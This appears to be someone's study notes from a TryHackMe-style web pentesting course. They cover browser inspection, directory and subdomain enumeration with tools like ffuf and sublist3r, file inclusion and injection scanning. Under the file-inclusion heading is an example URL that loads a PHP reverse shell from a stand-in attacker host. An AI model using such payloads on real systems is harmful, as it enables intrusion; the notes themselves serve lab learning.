## Walking An Application:
manually review a web application for security issues using only the in-built tools in your browser.

Checking HTML code: 

-Possible comments might reveal information 
-External files such as CSS, JavaScript and Images might have open permissions 
-using frameworks that might contain vulnerabilities ( A framework is a collection of premade code that easily allows a developer to include common features that a website would require)

Developer Tools

Using the dev tools and the inspector we can see code tat is nos specifically shown in the website and try to modify values to see hidden content 


Wappalyzer
([https://www.wappalyzer.com/](https://www.wappalyzer.com/))


## Content Discovery

3 ways 

Manually, Automated and OSINT

/robots.txt /sitemap.xml 

 curl http://10.10.230.5 -v -----> to display valuable information about the webpage 

We can investigate frameworks to find possible vulnerabilities

IMPORTANT: Github is a great source of information! for any pentest or CTF 

Automated directory busting 
-gobuter
-dirb
-ffuf
-feroxbuster

## Subdomain Enumeration
OSINT - BRUTE FORCE - VIRTUAL HOST 

We can find related subdomains utilizing certificates  [https://crt.sh](http://crt.sh/)   [https://ui.ctsearch.entrust.com/ui/ctsearchui](https://ui.ctsearch.entrust.com/ui/ctsearchui) in order to expand our attack surface 
 -site:www.tryhackme.com  site:*.tryhackme.com, find possible subdomains 

dnsrecon --> recoinansence tool 
amass
sublist3r --->  [Sublist3r](https://github.com/aboul3la/Sublist3r),  we can automate the above methods ---  ./sublist3r.py -d acmeitsupport.thm
DNSdumpster 


automated subdomain fuzzing with ffuf
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.56.145 -fs 2395 

-fs = exclude size value 
-fc = ony show 200 response 


## Authentication bypass



## Upload malicious payload 
LFI -local file inclusion 
RFI - remote file inclusion ----> we can use this vulnerability to upload a remote .php revershell 

example: http://webapp.thm/index.php?lang=http://attacker.thm/revershell.txt

## Injection 

wapiti is a tool we can use to scan webapps for injection vulnerabilities 

https://github.com/wapiti-scanner/wapiti

Wapiti works as a "black-box" vulnerability scanner,  that means it won'tstudy the source code of web applications but will work like a  fuzzer,scanning the pages of the deployed web application, extracting links andforms  and attacking  the scripts, sending payloads and looking for errormessages, special strings or abnormal behaviors.
